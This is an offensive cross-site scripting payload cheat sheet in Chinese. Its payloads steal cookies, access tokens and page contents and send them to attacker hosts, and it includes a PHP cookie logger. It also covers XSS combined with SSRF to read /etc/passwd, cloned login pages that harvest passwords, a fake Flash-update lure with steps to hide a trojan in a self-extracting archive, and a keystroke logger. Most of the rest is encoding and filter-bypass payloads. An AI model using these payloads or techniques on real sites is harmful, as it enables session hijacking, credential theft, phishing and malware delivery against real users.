  #### 确定XSS
  	反射型XSS可使用payload:<script>alert(1)</script>
	存储型不适宜alert(1)
	更好的替代品
	<script>alert(document.domain.concat("\n").concat(window.origin))</script>
	<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
  #### 打COOKIE
	<svg/onload="javascript:document.location.href=('http://xx.xx.xx.xx:7777?cookie='+document.cookie)">
	<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
	<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
	<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
	<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
	获取的cookie写入文件
```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```
  #### 读取HTML
	<svg/onload="document.location='http://xx.xx.xx.xx:7777/?'+btoa(document.body.innerHTML)">
  #### 读文件
	<svg/onload="
	xmlhttp=new XMLHttpRequest();
	xmlhttp.onreadystatechange=function()
	{
		if (xmlhttp.readyState==4 && xmlhttp.status==200)
		{
			document.location='http://xx.xx.xx.xx:7777/?'+btoa(xmlhttp.responseText);
		}
	}
	xmlhttp.open("GET","file.php",true);
	xmlhttp.send();
	">
  #### 修改HTML
  	<script>
	history.replaceState(null, null, '../../../login');
	document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
	</script>
  #### XSS+SSRF读取服务器文件
	<svg/onload="
	xmlhttp=new XMLHttpRequest();
	xmlhttp.onreadystatechange=function()
	{
	if (xmlhttp.readyState==4 && xmlhttp.status==200)
	{
	    document.location='http://vps_ip:23333/?'+btoa(xmlhttp.responseText);
	}
		}
	xmlhttp.open("POST","request.php",true);
	xmlhttp.setRequestHeader("Content-type","application/x-www-form-urlencoded");
	xmlhttp.send("url=file:///etc/passwd");
	">
  #### XSS克隆钓鱼
	保存js&css到服务器，登录action改为接受密码的文件action="./pass.php"
```php
    <?php //php
      $user=$_POST['username'];
      $pass=$_POST['password'];
      $file=fopen('pass.txt','a+');
      fwrite($file,$user."|"."pass" . "\n");
      fclose($file);
      echo "<script>window.location.href=\"http://192.168.0.1\"</script>\n";
    ?>
```
	构造payload
	<script>window.location.href="http://192.168.0.1/login.html"</script>
	php –S 0.0.0.0:8080 –t ./
  #### 伪造页面钓鱼
	方法1
	https://github.com/r00tSe7en/Fake-flash.cn
	添加xss平台模块
	window.alert = function(name){
	var iframe = document.createElement("IFRAME");
	iframe.style.display="none";
	iframe.setAttribute("src",'data:text/plain');
	document.documentElement.appendChild(iframe);
	window.frames[0].window.alert(name);
	iframe.parentNode.removeChild(iframe);
	}
	alert("您的FLASH版本过低，尝试升级后访问该页面！");
	window.location.href="http://www.flash.com";
	制作自解压捆绑
	一个马.exe，一个正常exe，全选，winrar添加到压缩文件，选择创建自解压格式压缩文件，高级->自解压选项，设置解压路径，c:\windows\temp\，设置->解压后运行两个exe文件，模式全部隐藏，更新，解压并更新文件，覆盖所有文件。
	ResourceHacker修改文件图标
	方法2
	if(empty($_COOKIE['flash'])){
		    echo '<script>alert("你当前计算机的Flash软件已经很久未更新，将导致无法正常显示界面内容，请下载安装最新版本！");window.location="http://www.flash.cn.xx.com/"</script>';
		    setcookie("flash","true",time()+30*2400);
	}
  #### 键盘记录
  	<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
  #### 更多PAYLOAD
  	http://www.xss-payloads.com/payloads-list.html?a#category=all
  #### 更多XSS盲打工具
  	https://github.com/s0md3v/XSStrike
	https://github.com/epsylon/xsser
	https://github.com/hahwul/dalfox
	https://github.com/hahwul/XSpear
	https://github.com/fcavallarin/domdig
  #### 常见payload
```javascript
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // 当手指触摸屏幕时触发
<body ontouchend=alert(1)>   // 当手指从触摸屏上移开时触发
<body ontouchmove=alert(1)>  // 当手指在屏幕上拖动时
```
  #### 远程Js
  	<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
	<script src=14.rs>
  #### 隐藏在输入框中的 XSS
  	<input type="hidden" accesskey="X" onclick="alert(1)">
	使用CTRL+SHIFT+X触发
  #### 带有 JavaScript 的 XSS
  	javascript:prompt(1)

	%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

	&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41

	\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
	\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
	\152\141\166\141\163\143\162\151\160\164\072alert(1)

	java%0ascript:alert(1)   - LF (\n)
	java%09script:alert(1)   - Horizontal tab (\t)
	java%0dscript:alert(1)   - CR (\r)

	\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)

	javascript://%0Aalert(1)
	javascript://anything%0D%0A%0D%0Awindow.alert(1)
  #### 带有data的 XSS
  	data:text/html,<script>alert(0)</script>
	data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
	<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
  #### 文件中的 XSS
  ##### XML CDATA
  	<name>
	  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
	</name>
  ##### XML 中的 XSS
	<html>
	<head></head>
	<body>
	<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
	</body>
	</html>
  ##### SVG 中的 XSS
	<?xml version="1.0" standalone="no"?>
	<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

	<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
	  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
	  <script type="text/javascript">
	    alert(document.domain);
	  </script>
	</svg>
  ##### SVG 中的 XSS（短）
	<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

	<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
	<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
	<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
  ##### Markdown 中的 XSS
	[a](javascript:prompt(document.cookie))
	[a](j a v a s c r i p t:prompt(document.cookie))
	[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
	[a](javascript:window.onerror=alert;throw%201)
  ##### SWF flash 应用程序中的 XSS
  	http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
	IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
	IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);

	flashmediaelement.swf?jsinitfunctio%gn=alert`1`
	flashmediaelement.swf?jsinitfunctio%25gn=alert(1)
	ZeroClipboard.swf?id=\"))} catch(e) {alert(1);}//&width=1000&height=1000
	swfupload.swf?movieName="]);}catch(e){}if(!self.a)self.a=!alert(1);//
	swfupload.swf?buttonText=test<a href="javascript:confirm(1)"><img src="https://web.archive.org/web/20130730223443im_/http://appsec.ws/ExploitDB/cMon.jpg"/></a>&.swf
	plupload.flash.swf?%#target%g=alert&uid%g=XSS&
	moxieplayer.swf?url=https://github.com/phwd/poc/blob/master/vid.flv?raw=true
	video-js.swf?readyFunction=alert(1)
	player.swf?playerready=alert(document.cookie)
	player.swf?tracecall=alert(document.cookie)
	banner.swf?clickTAG=javascript:alert(1);//
	io.swf?yid=\"));}catch(e){alert(1);}//
	video-js.swf?readyFunction=alert%28document.domain%2b'%20XSSed!'%29
	bookContent.swf?currentHTMLURL=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4
	flashcanvas.swf?id=test\"));}catch(e){alert(document.domain)}//
	phpmyadmin/js/canvg/flashcanvas.swf?id=test\”));}catch(e){alert(document.domain)}//
  ##### CSS 中的 XSS
	<!DOCTYPE html>
	<html>
	<head>
	<style>
	div  {
	    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
	    background-color: #cccccc;
	}
	</style>
	</head>
	  <body>
	    <div>lol</div>
	  </body>
	</html>
  #### 绕过过滤
  ##### 大小写
  	<sCrIpt>alert(1)</ScRipt>
  ##### 标签黑名单
  	<script x>
	<script x>alert('XSS')<script y>
  ##### 转义
  	eval('ale'+'rt(0)');
	Function("ale"+"rt(1)")();
	new Function`al\ert\`6\``;
	setTimeout('ale'+'rt(2)');
	setInterval('ale'+'rt(10)');
	Set.constructor('ale'+'rt(13)')();
	Set.constructor`al\x65rt\x2814\x29```;
  ##### 使用不完整的 html 标签
  	<img src='1' onerror='alert(0)' <
  ##### 字符串引号
  	String.fromCharCode(88,83,83)
  ##### 标签中的引号
	http://localhost/bla.php?test=</script><script>alert(1)</script>
	<html>
	  <script>
	    <?php echo 'foo="text '.$_GET['test'].'";';`?>
	  </script>
	</html>
  ##### 在 mousedown 事件中绕过引号
  	<a href="" onmousedown="var name = '&#39;;alert(1)//'; alert('smthg')">Link</a>
  ##### 绕过“点”过滤
  	<script>window['alert'](document['domain'])</script>
	IP地址转换为十进制格式
	http://www.geektools.com/cgi-bin/ipconv.cgi
	http://192.168.1.1== http://3232235777
	<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))<script>
	echo -n "alert(document.cookie)" | base64 编码为 YWxlcnQoZG9jdW1lbnQuY29va2llKQ==
  ##### 绕过字符串的括号
  	alert`1`
	setTimeout`alert\u0028document.domain\u0029`;
  ##### 绕过括号和分号
	<script>onerror=alert;throw 1337</script>
	<script>{onerror=alert}throw 1337</script>
	<script>throw onerror=alert,'some string',123,'haha'</script>

	<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>

	<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
  ##### 绕过onxxxx=黑名单
  	<object onafterscriptexecute=confirm(0)>
	<object onbeforescriptexecute=confirm(0)>

	<img src='1' onerror\x00=alert(0) />
	<img src='1' onerror\x0b=alert(0) />

	<img src='1' onerror/=alert(0) />
  ##### 绕过空格过滤
  	// 使用 "/" 绕过
	<img/src='1'/onerror=alert(0)>

	// 使用0x0c/^L  绕过
	<svgonload=alert(1)>

	$ echo "<svg^Lonload^L=^Lalert(1)^L>" | xxd
	00000000: 3c73 7667 0c6f 6e6c 6f61 640c 3d0c 616c  <svg.onload.=.al
	00000010: 6572 7428 3129 0c3e 0a                   ert(1).>.
  ##### 绕过电子邮件过滤
  	"><svg/onload=confirm(1)>"@x.y
  ##### 绕过document黑名单
  	<div id = "x"></div><script>alert(x.parentNode.parentNode.parentNode.location)</script>
	window["doc"+"ument"]
  ##### 在字符串中使用 javascript 绕过
	<script>
	foo="text </script><script>alert(1)</script>";
	</script>
  ##### 重定向
	location="http://google.com"
	document.location = "http://google.com"
	document.location.href="http://google.com"
	window.location.assign("http://google.com")
	window['location']['href']="http://google.com"
  ##### 其他方式的alert
  	window['alert'](0)
	parent['alert'](1)
	self['alert'](2)
	top['alert'](3)
	this['alert'](4)
	frames['alert'](5)
	content['alert'](6)

	[7].map(alert)
	[8].find(alert)
	[9].every(alert)
	[10].filter(alert)
	[11].findIndex(alert)
	[12].forEach(alert);

	prompt`${document.domain}`
	document.location='java\tscript:alert(1)'
	document.location='java\rscript:alert(1)'
	document.location='java\tscript:alert(1)'

	eval('ale'+'rt(0)');
	Function("ale"+"rt(1)")();
	new Function`al\ert\`6\``;

	constructor.constructor("aler"+"t(3)")();
	[].filter.constructor('ale'+'rt(4)')();

	top["al"+"ert"](5);
	top[8680439..toString(30)](7);
	top[/al/.source+/ert/.source](8);
	top['al\x65rt'](9);

	open('java'+'script:ale'+'rt(11)');
	location='javascript:ale'+'rt(12)';

	setTimeout`alert\u0028document.domain\u0029`;
	setTimeout('ale'+'rt(2)');
	setInterval('ale'+'rt(10)');
	Set.constructor('ale'+'rt(13)')();
	Set.constructor`al\x65rt\x2814\x29```;

	var i = document.createElement("iframe");
	i.onload = function(){
	  i.contentWindow.alert(1);
	}
	document.appendChild(i);

	// Bypassed security
	XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
	      var proxy = obj[name];
	      obj[name] = function () {
	        if (exec_original) {
	          return proxy.apply(this, arguments);
	        }
	      };
	      XSSObject.lockdown(obj, name);
	  };
	XSSObject.proxy(window, 'alert', 'window.alert', false);
  ##### >
  	<svg onload=alert(1)//
  ##### 绕过<>
  	Unicode 字符 U+FF1C 和 U+FF1E
  ##### ;
  	'te' * alert('*') * 'xt';
	'te' / alert('/') / 'xt';
	'te' % alert('%') % 'xt';
	'te' - alert('-') - 'xt';
	'te' + alert('+') + 'xt';
	'te' ^ alert('^') ^ 'xt';
	'te' > alert('>') > 'xt';
	'te' < alert('<') < 'xt';
	'te' == alert('==') == 'xt';
	'te' & alert('&') & 'xt';
	'te' , alert(',') , 'xt';
	'te' | alert('|') | 'xt';
	'te' ? alert('ifelsesh') : 'xt';
	'te' in alert('in') in 'xt';
	'te' instanceof alert('instanceof') instanceof 'xt';
  ##### HTML 编码
  	%26%2397;lert(1)
	&#97;&#108;&#101;&#114;&#116;
	></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
  ##### 片假名库
	https://github.com/aemkei/katakana.js
	javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
  ##### 楔形文字
  	𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
	𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
	+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
	+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
  ##### Lontara
  	ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
  ##### ECMAScript6
  	<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
  ##### Unicode 
  	Unicode character U+FF1C FULLWIDTH LESS­THAN SIGN (encoded as %EF%BC%9C) was
	transformed into U+003C LESS­THAN SIGN (<)

	Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
	transformed into U+0022 QUOTATION MARK (")

	Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
	transformed into U+0027 APOSTROPHE (')

	E.g : http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/
	%EF%BC%9E becomes >
	%EF%BC%9C becomes <

	绕过使用转换为大写的 Unicode
	İ (%c4%b0).toLowerCase() => i
	ı (%c4%b1).toUpperCase() => I
	ſ (%c5%bf) .toUpperCase() => S
	K (%E2%84%AA).toLowerCase() => k

	<ſvg onload=... > become <SVG ONLOAD=...>
	<ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
  ##### UTF-7
  	+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
  ##### UTF-8
  	< = %C0%BC = %E0%80%BC = %F0%80%80%BC
	> = %C0%BE = %E0%80%BE = %F0%80%80%BE
	' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
	" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
	" = %CA%BA
	' = %CA%B9
  ##### UTF-16be
  	%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
	\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
  ##### UTF-32
  	%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
  ##### 使用 BOM 绕过
  	字节顺序标记（页面必须以 BOM 字符开头。） BOM 字符允许您覆盖页面的字符集
	BOM Character for UTF-16 Encoding:
	Big Endian : 0xFE 0xFF
	Little Endian : 0xFF 0xFE
	XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E

	BOM Character for UTF-32 Encoding:
	Big Endian : 0x00 0x00 0xFE 0xFF
	Little Endian : 0xFF 0xFE 0x00 0x00
	XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
  ##### 奇怪的编码
  	<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
	<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
	<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
	<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
	<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
  ##### jsfuck
  	http://www.jsfuck.com/
	[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
  ##### CSP Bypass
	https://websecblog.com/vulns/google-csp-evaluator/
	<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"

